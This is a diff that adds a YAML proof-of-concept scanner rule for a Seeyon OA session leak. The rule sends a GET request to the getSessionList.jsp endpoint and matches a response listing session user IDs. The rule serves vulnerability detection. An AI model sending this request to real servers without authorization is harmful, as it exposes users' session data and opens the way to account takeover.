@@ -1,0 +1,10 @@
+name: poc-yaml-seeyon-session-leak
+rules:
+  - method: GET
+    path: /yyoa/ext/https/getSessionList.jsp?cmd=getAll
+    expression:
+      response.status == 200 && response.body.bcontains(b"<SessionList>\r\n<Session>\r\n<usrID>")
+detail:
+  author: sakura404x
+  links:
+    - https://github.com/apachecn/sec-wiki/blob/c73367f88026f165b02a1116fe1f1cd2b8e8ac37/doc/unclassified/zhfly3345.md
